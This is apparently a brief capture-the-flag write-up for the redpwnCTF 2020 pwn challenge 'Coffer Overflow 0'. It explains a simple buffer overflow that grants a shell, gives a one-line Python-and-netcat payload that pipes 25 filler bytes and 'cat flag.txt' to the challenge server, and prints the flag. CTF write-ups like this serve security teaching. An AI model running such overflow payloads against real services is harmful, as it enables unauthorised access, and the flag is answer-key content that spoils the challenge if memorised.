# Coffer Overflow 0
Points: 179
## Category
Pwn
## Problem Statement
Can you fill up the coffers? We even managed to find the source for you.\
nc 2020.redpwnc.tf 31199\
Attachment : "coffer-overflow-0" and "coffer-overflow-0.c"
## Solution
* A simple buffer over.\
* Code just check if value is non zero and gave access to shell.\
* `python -c 'print("a"*25);print("cat flag.txt");' | nc 2020.redpwnc.tf 31199`
## Flag
```
flag{b0ffer_0verf10w_3asy_as_123}
```